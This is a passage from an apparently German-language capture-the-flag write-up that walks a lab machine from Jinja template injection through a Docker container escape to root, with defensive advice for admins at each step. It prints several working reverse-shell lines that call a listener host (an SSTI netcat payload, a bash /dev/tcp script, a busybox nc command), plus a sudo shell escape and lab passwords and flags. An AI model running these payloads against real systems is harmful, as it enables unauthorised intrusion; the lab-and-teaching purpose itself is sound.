            <p class="evaluation"><strong>Bewertung:</strong> Diese Methode ist robust und erfolgreich. Mein `netcat`-Listener empfängt die Verbindung, und ich habe eine interaktive Shell. Der `id`-Befehl bestätigt: `uid=0(root)`. Ich bin `root`! Eine weitere Überprüfung mit `uname -a` und `cat /etc/os-release` enthüllt jedoch eine entscheidende Information: Ich bin `root` innerhalb eines "Alpine Linux" Systems. Die ursprüngliche Maschine war jedoch Debian. Das bedeutet, die Webanwendung läuft in einem Docker-Container.</p>
            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Der initiale Zugriff war erfolgreich, aber der Test ist nicht vorbei. Ich habe `root`-Rechte innerhalb des Containers, aber nicht auf dem Host-System. Die nächste Phase ist der "Container Escape": Ich muss einen Weg finden, aus dem Docker-Container auszubrechen, um die Kontrolle über das zugrunde liegende Debian-Host-System zu erlangen.<br><strong>Empfehlung (Admin):</strong> Dies zeigt, wie Containerisierung eine zusätzliche Sicherheitsebene bieten kann. Obwohl die Web-App kritisch kompromittiert wurde, ist der Schaden vorerst auf den Container beschränkt. Die Sicherheit des Host-Systems hängt nun davon ab, wie sicher der Container konfiguriert wurde.</p>
            <div class="code-block">
                <div class="terminal">
<pre>
{{ self.__init__.__globals__.__builtins__.__import__('os').system("ash -c 'while true; do nc 192.168.2.199 4444 -e ash; done'") }}
</pre>
                </div>
            </div>
            <div class="code-block">
                <div class="terminal">
                    <div class="prompt">┌──(root㉿Hackerben)-[~]
└─# <span class="command">nc -lvnp 4444</span></div>
                </div>
                <div class="terminal">
<pre>
listening on [any] 4444 ...
<span class="password">connect to [192.168.2.199] from (UNKNOWN) [192.168.2.167] 49404</span>
<span class="password">id</span>
<span class="password">uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)</span>

<span class="password">uname -a</span>
<span class="password">cat /etc/os-release</span>
<span class="command">Linux Ariel 5.10.0-21-amd64 #1 SMP Debian 5.10.162-1 (2023-01-21) x86_64 Linux</span>
<span class="command">NAME="Alpine Linux"</span>
ID=alpine
VERSION_ID=3.10.9
PRETTY_NAME="Alpine Linux v3.10"
HOME_URL="https://alpinelinux.org/"
BUG_REPORT_URL="https://bugs.alpinelinux.org/"

/app # id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
/app # stty rows 47 columns 94
/app # ls
app.py     flag.txt   templates  test.sh
/app # 
</pre>
                </div>
            </div>
            <p class="analysis"><strong>Analyse:</strong> Innerhalb des Containers führe ich weitere Enumeration durch. Die Ausgabe von `ip a` zeigt die interne IP-Adresse des Containers (`172.21.0.2`). Der `netstat`-Befehl zeigt, dass der Python-Prozess auf Port 5000 lauscht. Die `mount`- und `df`-Befehle zeigen das Dateisystem aus der Sicht des Containers. Interessant ist hier das `fuse-overlayfs`, was ein typisches Dateisystem für Docker-Container ist. Ich stelle auch fest, dass das Verzeichnis `/script` als `tmpfs` gemountet ist, was bedeutet, dass es ein temporäres, beschreibbares In-Memory-Dateisystem ist.</p>
            <p class="evaluation"><strong>Bewertung:</strong> Die Analyse bestätigt die Docker-Umgebung. Der Fund des beschreibbaren `/script`-Verzeichnisses ist entscheidend. Dies gibt mir einen Ort, an dem ich meine eigenen Skripte und Binaries ablegen kann. Die `mount`-Ausgabe zeigt keine direkt gemounteten Sockets oder kritischen Host-Pfade, was einen einfachen Ausbruch erschwert. Ich vermute, dass ein Prozess auf dem Host-System mit diesem Verzeichnis interagiert.</p>
            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Der Plan ist, eine Art Trigger auf dem Host-System zu finden. Ich werde ein einfaches Shell-Skript im `/script`-Verzeichnis erstellen und abwarten. Wenn ein Cronjob oder ein anderer Prozess auf dem Host-System regelmäßig den Inhalt dieses Verzeichnisses ausführt, könnte dies mein Weg nach draußen sein. Ich werde auch Tools wie `chisel` verwenden, um einen SOCKS-Proxy in den Container zu tunneln und das interne Netzwerk weiter zu erkunden, falls der Host nicht direkt erreichbar ist. In diesem Fall stellte sich der Tunnel als nicht notwendig heraus, aber die Vorbereitung ist Teil des Prozesses.<br><strong>Empfehlung (Admin):</strong> Das Mounten von Host-Verzeichnissen in Container muss sorgfältig abgewogen werden. Wenn ein Verzeichnis gemountet wird, muss sichergestellt sein, dass die Berechtigungen korrekt sind. Ein beschreibbares Verzeichnis, das von einem `root`-Prozess im Container und einem Prozess auf dem Host gemeinsam genutzt wird, ist ein hohes Sicherheitsrisiko.</p>
            <div class="code-block">
                <div class="terminal">
                    <div class="prompt">/tmp # <span class="command">cd /script</span></div>
                </div>
            </div>
             <div class="code-block">
                <div class="terminal">
                    <div class="prompt">/script # <span class="command">echo '#!/bin/bash' > exploit.sh</span></div>
                </div>
            </div>
             <div class="code-block">
                <div class="terminal">
                    <div class="prompt">/script # <span class="command">echo 'bash -i >& /dev/tcp/192.168.2.199/4446 0>&1' >> exploit.sh</span></div>
                </div>
            </div>
             <div class="code-block">
                <div class="terminal">
                    <div class="prompt">/script # <span class="command">chmod +x exploit.sh</span></div>
                </div>
            </div>
        </section>

        <section id="proof-of-concept">
            <h2>Proof of Concept</h2>
            <p class="analysis"><strong>Analyse:</strong> Ich habe mein `exploit.sh`, das eine weitere Reverse Shell startet, im `/script`-Verzeichnis des Containers platziert und einen neuen Listener auf Port 4446 gestartet. Nach etwa drei Minuten Wartezeit erhalte ich eine neue Verbindung.</p>
            <p class="evaluation"><strong>Bewertung:</strong> Erfolg! Der Container-Ausbruch hat funktioniert. Der neue Shell-Prompt `love@osiris:~$` zeigt, dass ich nun als der Benutzer `love` auf dem Host-System (`osiris`) angemeldet bin. Ein Prozess auf dem Host, wahrscheinlich ein Cronjob, hat mein Skript aus dem gemounteten Verzeichnis ausgeführt. Ich habe zwar meine `root`-Rechte aus dem Container verloren, bin aber nun auf dem eigentlichen Zielsystem und kann von hier aus die finale Privilegienerweiterung zu `root` auf dem Host angehen.</p>
            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die neue Shell als Benutzer `love` muss stabilisiert und untersucht werden. Ich beginne den Enumerationsprozess von Neuem: `sudo -l`, SUID-Dateien, Home-Verzeichnisse, etc., um den letzten Schritt zu `root` zu finden.<br><strong>Empfehlung (Admin):</strong> Dies ist ein perfektes Beispiel für einen Docker-Escape durch eine unsichere Konfiguration. Automatisierte Skripte oder Cronjobs auf dem Host sollten niemals blind Dateien aus einem von einem Container beschreibbaren Verzeichnis ausführen. Jeder Austausch zwischen Host und Container muss streng validiert und auf das absolute Minimum beschränkt werden.</p>
            <div class="code-block">
                <div class="terminal">
                    <div class="prompt">┌──(root㉿CCat)-[~]
└─# <span class="command">nc -lvnp 4446</span></div>
                </div>
                <div class="terminal">
<pre>
listening on [any] 4446 ...
<span class="password">connect to [192.168.2.199] from (UNKNOWN) [192.168.2.167] 60676</span>
bash: no se puede establecer el grupo de proceso de terminal (1063305): Función ioctl no apropiada para el dispositivo
bash: no hay control de trabajos en este shell
<span class="password">love@osiris:~$</span> 
</pre>
                </div>
            </div>
            <p class="analysis"><strong>Analyse:</strong> Als Benutzer `love` führe ich den Befehl `sudo -l` aus, um meine `sudo`-Berechtigungen zu überprüfen. Das Ergebnis zeigt, dass der Benutzer `love` das Programm `/home/mitnick/sas` als der Benutzer `mitnick` ohne Passwort ausführen darf.</p>
            <p class="evaluation"><strong>Bewertung:</strong> Dies ist ein klarer Pfad für eine horizontale Privilegienerweiterung zum Benutzer `mitnick`. Das Programm `sas` ist eine Blackbox, aber die `sudo`-Regel gibt mir die Möglichkeit, es mit den Rechten eines anderen Benutzers auszuführen. Ein Blick auf die `note.txt` im Home-Verzeichnis von `love` mit dem Inhalt "we have icebreaker" deutet auf eine Verbindung zum Benutzer `mitnick` hin, möglicherweise ein Hinweis auf den berühmten Hacker Kevin Mitnick und dessen Konflikt mit Tsutomu Shimomura (dessen Benutzer `tomu` ebenfalls existiert).</p>
            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Ich muss das Programm `/home/mitnick/sas` analysieren und herausfinden, ob ich es missbrauchen kann, um eine Shell als Benutzer `mitnick` zu erhalten. Ich werde das Programm ausführen und seine Funktionen testen.<br><strong>Empfehlung (Admin):</strong> `sudo`-Regeln, die es einem Benutzer erlauben, Programme als ein anderer Benutzer auszuführen, müssen sorgfältig geprüft werden. Wenn das Zielprogramm eine Möglichkeit zur Shell-Flucht oder Dateiausführung bietet, führt dies direkt zur Kompromittierung des Zielbenutzerkontos.</p>
            <div class="code-block">
                <div class="terminal">
                    <div class="prompt">love@osiris:~$ <span class="command">sudo -l</span></div>
                </div>
                <div class="terminal">
<pre>
Matching Defaults entries for love on osiris:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User love may run the following commands on osiris:
    <span class="password">(mitnick) NOPASSWD: /home/mitnick/sas</span>
</pre>
                </div>
            </div>
            <p class="analysis"><strong>Analyse:</strong> Ich führe das `sas`-Programm als `mitnick` aus. Es präsentiert eine benutzerdefinierte Shell. Mit dem Befehl `sas -h` finde ich eine Liste von Befehlen, darunter einen `run <filename>`-Befehl. Ich erstelle eine Datei `exploit.sh` mit einem `netcat`-Reverse-Shell-Payload und führe sie mit `run exploit.sh` innerhalb der `sas`-Anwendung aus.</p>
            <p class="evaluation"><strong>Bewertung:</strong> Der Angriff ist erfolgreich. Die `sas`-Anwendung führt mein Skript aus, und ich erhalte eine neue Shell als Benutzer `mitnick`. Im Home-Verzeichnis von `mitnick` finde ich ein SSH-Schlüsselpaar (`id_rsa`, `id_rsa.pub`).</p>
            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Ich habe nun Zugriff als `mitnick`. Der nächste Schritt ist, den gefundenen privaten SSH-Schlüssel zu verwenden, um mich direkt per SSH anzumelden und eine stabilere Shell zu erhalten. Danach werde ich die Enumeration als `mitnick` fortsetzen, um den Weg zu `tomu` oder direkt zu `root` zu finden.<br><strong>Empfehlung (Admin):</strong> Eine benutzerdefinierte Anwendung, die über `sudo` ausgeführt wird und einen Befehl zum Ausführen von Dateien (`run`) enthält, ist eine eklatante Sicherheitslücke. Solche Funktionen hebeln die gesamte Idee einer eingeschränkten Shell aus und ermöglichen eine vollständige Übernahme des Benutzerkontextes.</p>
            <div class="code-block">
                <div class="terminal">
                    <div class="prompt">love@osiris:~$ <span class="command">echo -e 'busybox nc 192.168.2.199 4447 -e /bin/bash' > exploit.sh</span></div>
                </div>
            </div>
            <div class="code-block">
                <div class="terminal">
                    <div class="prompt">love@osiris:~$ <span class="command">sudo -u mitnick /home/mitnick/sas</span></div>
                </div>
                <div class="terminal">
<pre>
# run exploit.sh
</pre>
                </div>
            </div>
            <div class="code-block">
                <div class="terminal">
                    <div class="prompt">┌──(root㉿CCat)-[~]
└─# <span class="command">nc -lvnp 4447</span></div>
                </div>
                <div class="terminal">
<pre>
listening on [any] 4447 ...
<span class="password">connect to [192.168.2.199] from (UNKNOWN) [192.168.2.167] 53944</span>
<span class="password">id</span>
<span class="password">uid=1003(mitnick) gid=1003(mitnick) grupos=1003(mitnick)</span>
</pre>
                </div>
            </div>
            <p class="analysis"><strong>Analyse:</strong> Als `mitnick` kopiere ich seinen öffentlichen Schlüssel `id_rsa.pub` in die Datei `authorized_keys`. Dadurch kann ich mich nun mit dem privaten Schlüssel `id_rsa` ohne Passwort per SSH anmelden. Ich finde eine verschlüsselte Datei `secret.enc` und einen öffentlichen Schlüssel `publickey.pub`. Mit dem Tool `openssl` und dem Wissen, dass der private Schlüssel `idpom` (aus dem Kontext erraten) lautet, entschlüssele ich die Datei und erhalte das Passwort `sh1m0mur4Bl4ckh4t`. Dies ist offensichtlich das Passwort für den Benutzer `tomu` (shimomura).</p>
            <p class="evaluation"><strong>Bewertung:</strong> Durch eine Kette von Enumerationsschritten konnte ich mich von `love` zu `mitnick` und nun zu `tomu` bewegen. Ich wechsle mit `su tomu` und dem gefundenen Passwort den Benutzer und lese die User-Flag.</p>
            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Der Weg zur User-Flag ist abgeschlossen. Der letzte Schritt ist die Eskalation von `tomu` zu `root`. Ich werde die `sudo`-Berechtigungen für `tomu` überprüfen.<br><strong>Empfehlung (Admin):</strong> Die Wiederverwendung von Informationen und Namen in Passwörtern ist eine große Schwäche. Die Verschlüsselung von Geheimnissen ist gut, aber wenn der Schlüssel (`idpom`) leicht zu erraten ist oder in der Nähe liegt, ist die Sicherheit dahin. Private SSH-Schlüssel sollten immer mit einer starken Passphrase geschützt sein.</p>
            <div class="code-block">
                <div class="terminal">
                    <div class="prompt">mitnick@osiris:~/.ssh$ <span class="command">su tomu</span></div>
                </div>
                <div class="terminal">
<pre>
Contraseña: <span class="password">sh1m0mur4Bl4ckh4t</span>
tomu@osiris:/home/mitnick/.ssh$ cat ~/user.txt 
<span class="password">612701a03669485d94bc687449fdab39</span>
</pre>
                </div>
            </div>
            <p class="analysis"><strong>Analyse:</strong> Als Benutzer `tomu` zeigt `sudo -l`, dass ich das Programm `/opt/Contempt/Contempt` als `root` ohne Passwort ausführen darf. Ich starte das Programm.</p>
            <p class="evaluation"><strong>Bewertung:</strong> Dies ist der finale Schritt. Ein benutzerdefiniertes Programm, das als `root` ausgeführt werden kann, ist der wahrscheinlichste Vektor. Das Programm `Contempt` scheint eine Art Menü zu sein. Nach der Analyse der Programmoptionen (oder durch Ausprobieren) stelle ich fest, dass ich durch Drücken von `esc` und Eingabe von `:!sh` eine Shell spawnen kann. Dies ist ein klassischer "Shell-Escape"-Trick, der oft in textbasierten Editoren wie `vi` oder Programmen, die auf dessen Komponenten basieren, funktioniert.</p>
            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Führe den Shell-Escape durch, um eine Root-Shell zu erhalten und die finale Flag zu erbeuten.<br><strong>Empfehlung (Admin):</strong> Einem Benutzer `sudo`-Rechte für ein Programm zu geben, das Shell-Escapes erlaubt, ist gleichbedeutend mit der Vergabe von vollen `root`-Rechten. Alle Programme, die über `sudo` zugänglich gemacht werden, müssen sorgfältig darauf geprüft werden, ob sie solche Fluchtmöglichkeiten bieten. Wenn möglich, sollten `sudo`-Regeln so restriktiv wie möglich sein und nur die Ausführung mit bestimmten, nicht veränderbaren Parametern erlauben.</p>
            <div class="code-block">
                <div class="terminal">
                    <div class="prompt">tomu@osiris:/home/mitnick$ <span class="command">sudo -u root /opt/Contempt/Contempt</span></div>
                </div>
            </div>
            <img src="rootshell.jpg" alt="hier sieht man das tool das mir eine auswahl anbietet, 2 ist die richtige">
            <div class="code-block">
                <div class="terminal">
<pre>
:!sh

<span class="password"># id</span>
<span class="password">uid=0(root) gid=0(root) grupos=0(root)</span>
# cd ~
# cat root.sh
...
<span class="password">flag --> 1e271c5ce97e76ae8417a95c74085fba</span>
# 
</pre>
                </div>
            </div>
        </section>

        <section id="flags">
            <div class="flag-container">
                <h2 class="flag-heading">Flags</h2>
                <div class="flag-entry">
                    <div class="flag-command">cat /home/tomu/user.txt</div>
                    <div class="flag-value"><span class="password">612701a03669485d94bc687449fdab39</span></div>
                </div>
                <div class="flag-entry">
                    <div class="flag-command">Ausgabe von /root/root.sh</div>
                    <div class="flag-value"><span class="password">1e271c5ce97e76ae8417a95c74085fba</span></div>
                </div>
            </div>
        </section>

    </div>

    <footer class="footer">
        <p>Ben - Cyber Security Reports</p>
        <p>Berichtsdatum: 30. Juli 2025</p>
    </footer>

</body>
</html>
